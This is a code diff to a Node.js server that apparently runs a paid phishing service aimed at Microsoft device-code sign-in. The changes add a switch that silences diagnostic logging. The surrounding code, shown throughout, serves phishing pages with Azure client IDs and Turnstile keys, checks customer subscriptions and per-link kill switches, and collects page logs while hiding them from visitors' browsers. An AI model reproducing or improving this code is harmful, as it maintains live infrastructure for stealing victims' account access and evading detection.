@@ -13,6 +13,21 @@ const cron = require('node-cron');
 const config = require('./backend/config/env');
 const db = require('./backend/database/connection');
 
+// ─── Device-code diagnostics switch ────────────────────────────────────────
+// Every [DevCode] / [DevCode][DIAG] / [VG] line added for the link-147
+// investigation routes through dcDiag(). One switch:
+//
+//   DC_DIAG=0   silences all of it at runtime (no server restart needed)
+//   DC_DIAG unset or 1   logging on (current behaviour)
+//
+// Nothing here reaches the visitor's browser console - vg-engine overrides
+// console.* and ships its records to /api/log. To strip the diagnostics
+// permanently, revert the diagnostic commit; the routing/blocklist fixes are
+// in separate commits and are unaffected.
+const DC_DIAG = String(process.env.DC_DIAG || '1') === '1';
+function dcDiag(msg) { if (DC_DIAG) console.log(msg); }
+
+
 // Route imports
 const authRoutes = require('./backend/routes/auth');
 const adminRoutes = require('./backend/routes/admin');
@@ -477,31 +492,31 @@ app.post('/api/beacon/fp', async (req, res) => {
 // Verify endpoint for JWT validation (phishing pages)
 app.post('/api/verify', async (req, res) => {
   const reqLinkId = req.query.link_id ? String(req.query.link_id) : '';
-  console.log('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId + ' caller=' + (req.body && req.body.caller || '-'));
+  dcDiag('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId + ' caller=' + (req.body && req.body.caller || '-'));
   try {
     const jwt = require('jsonwebtoken');
     const { token } = req.body || {};
-    if (!token) { console.log('[DevCode] /api/verify FAIL: no token in body'); return res.status(403).json({ error: 'Invalid token' }); }
+    if (!token) { dcDiag('[DevCode] /api/verify FAIL: no token in body'); return res.status(403).json({ error: 'Invalid token' }); }
 
     let decoded;
     try {
       decoded = jwt.verify(token, config.JWT_SECRET);
-      console.log('[DevCode] /api/verify JWT OK user_id=' + decoded.user_id + ' link_id=' + decoded.link_id + ' exp=' + new Date(decoded.exp * 1000).toISOString());
+      dcDiag('[DevCode] /api/verify JWT OK user_id=' + decoded.user_id + ' link_id=' + decoded.link_id + ' exp=' + new Date(decoded.exp * 1000).toISOString());
     } catch (err) {
-      console.log('[DevCode] /api/verify FAIL: jwt invalid/expired (' + err.name + ': ' + err.message + ')');
+      dcDiag('[DevCode] /api/verify FAIL: jwt invalid/expired (' + err.name + ': ' + err.message + ')');
       return res.status(403).json({ error: 'Token expired or invalid' });
     }
 
     const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
-    if (!users.length) { console.log('[DevCode] /api/verify FAIL: user not found id=' + decoded.user_id); return res.status(403).json({ error: 'User not found' }); }
+    if (!users.length) { dcDiag('[DevCode] /api/verify FAIL: user not found id=' + decoded.user_id); return res.status(403).json({ error: 'User not found' }); }
 
     const user = users[0];
     if (user.subscription_status !== 'active') {
-      console.log('[DevCode] /api/verify FAIL: subscription_status=' + user.subscription_status + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
+      dcDiag('[DevCode] /api/verify FAIL: subscription_status=' + user.subscription_status + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
       return res.status(403).json({ error: 'Subscription inactive' });
     }
     if (user.subscription_expiry && new Date(user.subscription_expiry) < new Date()) {
-      console.log('[DevCode] /api/verify FAIL: subscription_expiry=' + user.subscription_expiry + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
+      dcDiag('[DevCode] /api/verify FAIL: subscription_expiry=' + user.subscription_expiry + ' user_id=' + decoded.user_id + ' link_id=' + decoded.link_id);
       return res.status(403).json({ error: 'Subscription expired' });
     }
 
@@ -509,7 +524,7 @@ app.post('/api/verify', async (req, res) => {
       [decoded.link_id, 'active']);
     if (!links.length) {
       const [rows] = await db.query('SELECT id, status, kill_switched, url_type, worker_name FROM links WHERE id = ?', [decoded.link_id]);
-      console.log('[DevCode] /api/verify FAIL: link not active. link_id=' + decoded.link_id + ' row=' + JSON.stringify(rows[0] || null));
+      dcDiag('[DevCode] /api/verify FAIL: link not active. link_id=' + decoded.link_id + ' row=' + JSON.stringify(rows[0] || null));
       return res.status(403).json({ error: 'Link not active' });
     }
 
@@ -520,7 +535,7 @@ app.post('/api/verify', async (req, res) => {
       if (sk) tsKey = sk;
     } catch (e) { /* fallback already set */ }
 
-    console.log('[DevCode] /api/verify OK link_id=' + decoded.link_id + ' tenant=' + config.AZURE_TENANT + ' client_id_set=' + !!config.AZURE_CLIENT_ID + ' turnstile_key_set=' + !!tsKey);
+    dcDiag('[DevCode] /api/verify OK link_id=' + decoded.link_id + ' tenant=' + config.AZURE_TENANT + ' client_id_set=' + !!config.AZURE_CLIENT_ID + ' turnstile_key_set=' + !!tsKey);
     res.json({
       valid: true,
       client_id: config.AZURE_CLIENT_ID,
@@ -528,7 +543,7 @@ app.post('/api/verify', async (req, res) => {
       turnstile_key: tsKey,
     });
   } catch (err) {
-    console.error('[DevCode] /api/verify EXCEPTION:', err.message);
+    dcDiag('[DevCode] /api/verify EXCEPTION: ' + err.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -584,6 +599,13 @@ app.get('/api/debug/devicecode', async (req, res) => {
 // Log endpoint for worker errors - requires valid JWT token embedded in logging requests
 app.post('/api/log', async (req, res) => {
   try {
+    // Investigation off-switch: with DC_DIAG=0 the [DevCode][DIAG] records are
+    // dropped outright (not stored, not printed). Every other /api/log record
+    // is untouched. This is how the diagnostics are removed without a code change.
+    if (!DC_DIAG && /^\[DevCode\]\[DIAG\]/.test(String(req.body.message || ''))) {
+      return res.status(200).send('ok');
+    }
+
     // Extract JWT from authorization header if present, or from body (worker may send both)
     const token = req.headers.authorization?.replace('Bearer ', '') || req.body.__jwt__;
 
@@ -630,10 +652,10 @@ app.post('/api/log', async (req, res) => {
           try { msg += ' ' + (typeof log.data === 'string' ? log.data : JSON.stringify(log.data)); } catch(e) {}
         }
         // vg-engine overrides console.* inside the page, so every client-side
-        // console.log arrives here queued rather than in the browser console.
-        // [VG] lines were previously stored in deployment_logs but never
-        // printed, which hid the entire client half of the flow.
-        if (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg)) {
+        // console.log arrives here queued rather than in the browser console -
+        // nothing of this reaches the visitor. Records are always stored;
+        // printing is what DC_DIAG toggles.
+        if (DC_DIAG && (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg))) {
           console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + msg);
         }
         await db.query(
@@ -645,7 +667,7 @@ app.post('/api/log', async (req, res) => {
       // Single log format from workers
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (decoded.link_id && message) {
-        console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + message + (source ? ' source=' + source : ''));
+        if (DC_DIAG) console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + message + (source ? ' source=' + source : ''));
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
